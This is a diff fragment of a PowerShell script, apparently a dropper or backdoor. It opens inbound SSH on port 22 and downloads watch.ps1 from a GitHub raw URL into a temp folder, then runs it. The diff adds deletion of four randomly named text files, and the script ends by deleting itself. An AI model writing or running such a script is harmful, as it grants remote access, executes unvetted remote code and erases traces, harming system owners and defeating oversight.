@@ -25,10 +25,13 @@ if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyCon
     New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
 }
 
-# Watching 
+# Watching
 mkdir $env:Temp/$temp_dir
 Invoke-WebRequest 'raw.githubusercontent.com/DomoKrch/experiments/main/watch.ps1' -OutFile $env:Temp/$temp_dir/watch.ps1
 & $env:Temp/$temp_dir/watch.ps1
 
-
+Remove-Item .\7r6lYgoLlv.txt
+Remove-Item .\etgtYmwQUO.txt
+Remove-Item .\f4EWj29Hgq.txt
+Remove-Item .\OWEeX45e3U.txt
 Remove-Item $PSCommandPath -Force
